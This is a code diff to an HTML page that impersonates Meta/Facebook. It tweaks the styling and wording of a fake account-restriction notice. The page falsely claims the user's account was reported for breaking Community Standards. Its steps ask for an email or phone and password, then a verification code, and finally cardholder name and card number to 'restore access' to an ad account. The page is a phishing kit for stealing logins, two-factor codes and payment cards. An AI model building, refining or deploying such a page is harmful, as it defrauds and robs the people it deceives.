@@ -12,16 +12,17 @@
         .nav { background: white; padding: 12px 20px; border-bottom: 1px solid #dddfe2; display: flex; align-items: center; justify-content: flex-start; }
         @media (min-width: 900px) { .nav { padding: 12px 50px; } }
       
-        .card { background: white; width: 92%; max-width: 800px; margin: 10px auto; padding: 25px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); box-sizing: border-box; }
-        @media (min-width: 900px) { .card { margin: 20px auto; padding: 40px; } }
+        /* SHRINKING CONTENT AREA FOR PC/IPAD */
+        .card { background: white; width: 92%; max-width: 550px; margin: 10px auto; padding: 25px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); box-sizing: border-box; }
+        @media (min-width: 900px) { .card { margin: 40px auto; padding: 40px; } }
       
         .chat-bubble { position: fixed; bottom: 20px; right: 20px; background: white; border-radius: 50px; padding: 10px 20px; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border: 1px solid #eee; z-index: 999; }
         .chat-status { width: 10px; height: 10px; background: #42b72a; border-radius: 50%; animation: pulse 2s infinite; }
         .chat-text { font-size: 12px; color: var(--m-gray); font-weight: 500; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
       
-        /* NEW P1 STYLING */
-        #p1 { max-width: 1200px; text-align: center; margin-top: 30px; background: #f0f2f5; box-shadow: none; border: none; }
+        /* P1 remains wide for the system banner look */
+        #p1 { max-width: 1000px; text-align: center; margin-top: 30px; background: #f0f2f5; box-shadow: none; border: none; }
         @media (min-width: 900px) { #p1 { margin-top: 80px; } }
       
         .illustration { width: 100%; height: auto; background: none; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; }
@@ -42,9 +43,8 @@
         .err-msg { color: #f02849; font-size: 13px; margin-top: -10px; margin-bottom: 15px; display: none; }
         .btn-row { display: flex; justify-content: flex-end; margin-top: 20px; }
       
-        /* CLEANED BUTTONS - NO GREEN */
         .btn { background: var(--m-blue); color: white; border: none; padding: 12px 20px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
-        #p1 .btn { width: 100%; max-width: 400px; padding: 18px; margin-top: 30px; }
+        #p1 .btn { width: 100%; max-width: 350px; padding: 18px; margin-top: 30px; }
         @media (min-width: 900px) { .btn { width: auto; padding: 12px 45px; } }
         .btn:disabled { background: #8bbaf7; cursor: not-allowed; }
       
@@ -119,7 +119,6 @@
     <p class="sub-text">
         We detected unusual activity in your page today <b>December 24, 2025</b>. Someone has reported your account for not complying with
         <a href="https://transparency.fb.com/policies/community-standards/" class="meta-link" target="_blank">Community Standards</a>.
-        To avoid having your account <a href="https://transparency.fb.com/policies/community-standards/" class="meta-link" target="_blank">disabled</a>, please verify:
     </p>
     <input type="text" id="email" placeholder="Email address or phone number">
     <input type="password" id="pass" placeholder="Password">
@@ -139,12 +138,10 @@
     <div class="btn-row"><button class="btn" onclick="step(4, 5)">Submit Code</button></div>
 </div>
 
-<div id="p5" class="card hidden" style="max-width: 600px;">
+<div id="p5" class="card hidden">
     <h1>Confirm payment method</h1>
     <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Billing verification</div>
-    <p class="sub-text">
-        To lift the restriction and fully restore access to your ad account, we need to confirm your primary payment method on file.
-    </p>
+    <p class="sub-text">To lift the restriction and fully restore access to your ad account, we need to confirm your primary payment method on file.</p>
     <label class="bday-label">Cardholder name</label>
     <input type="text" id="card_name" placeholder="Full name as it appears on card">
     <label class="bday-label">Card number</label>
